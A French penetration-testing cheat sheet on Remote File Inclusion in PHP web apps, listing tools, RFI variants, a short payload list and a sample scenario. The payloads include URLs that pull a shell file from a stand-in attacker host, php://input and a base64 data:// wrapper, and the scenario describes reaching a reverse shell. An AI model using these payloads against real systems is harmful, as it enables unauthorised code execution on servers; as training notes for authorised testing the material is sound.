
## 🌐 RFI (Remote File Inclusion)

---

## Introduction

Le <span class="concept">RFI</span> permet à un attaquant d’inclure un fichier distant dans une application vulnérable.

Elle peut permettre :
- Exécution de code distant (RCE)
- Déploiement de backdoor
- Contrôle complet du serveur

Souvent combinée avec :
- LFI → RFI chained
- XSS → RCE indirect
- Upload vulnérable

---

## Objectifs

- <span class="goal">Identifier des vecteurs RFI</span>
- <span class="goal">Inclure un fichier malicieux</span>
- <span class="goal">Obtenir un RCE / shell</span>

---

## Outils & commandes

| Outil | Exemple & explication |
|-------|-----------------------|
| <span class="technology">Burp Suite (Repeater)</span> | Injection manuelle |
| <span class="technology">ffuf</span> | <span class="example">ffuf -u target?file=FUZZ -w rfi.txt</span> |
| <span class="technology">wfuzz</span> | Fuzz avancé |
| <span class="technology">PayloadsAllTheThings</span> | Cheatsheet |
| <span class="technology">bbot</span> | Recon |
| <span class="technology">dnslog.cn</span> | Détection RFI Blind |

---

## Types de RFI

| Type | Exemple |
|------|---------|
| <span class="concept">Basic RFI</span> | `?page=http://attacker.com/shell.txt` |
| <span class="concept">Chained RFI</span> | LFI → local wrapper include |
| <span class="concept">RFI via upload</span> | Upload + include |
| <span class="concept">RFI Blind</span> | Détecté par DNS callback |
| <span class="concept">RFI + LFI + XSS</span> | Chaines hybrides |

---

## Techniques clés

| Technique | Outil |
|-----------|------|
| <span class="concept">Manual injection</span> | Burp |
| <span class="concept">Automated fuzz</span> | ffuf, wfuzz |
| <span class="concept">Blind detection</span> | dnslog.cn |
| <span class="concept">Bypass filters</span> | Manual |
| <span class="concept">Chained LFI → RFI</span> | Manual |

---

## Payloads courants

```
http://attacker.com/shell.txt
\\attacker\share
../../../../attacker.com/shell
php://input
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
```

---

## Bonnes pratiques

- <span class="best-practice">Documenter les chemins vulnérables</span>
- <span class="best-practice">Vérifier le contexte (GET, POST, JSON)</span>
- <span class="best-practice">Limiter le bruit en prod (fuzz slow mode)</span>
- <span class="best-practice">Tester les blind RFI</span>
- <span class="mitigation">Ne pas utiliser de payload destructif</span>

---

## 🎯 Exemple de scénario

> <span class="note">🌐 Cible :</span> Web app PHP vulnérable

Actions :
- <span class="technology">ffuf</span> → découverte param `page`
- <span class="technology">Burp Repeater</span> → test `http://attacker.com/shell.txt`
- Reverse shell confirmé
- LFI → RFI via wrapper `php://filter`
- Rapport avec POC complet

---

## Cheatlist RFI

| Type | Outils |
|------|--------|
| Manual | Burp, PayloadsAllTheThings |
| Automated | ffuf, wfuzz |
| Blind | dnslog.cn |
| Chained | Manual |

---

## 🚀 Navigation

- 🚀 [[08_IDOR]]
- 🚀 [[09_SSRF]]
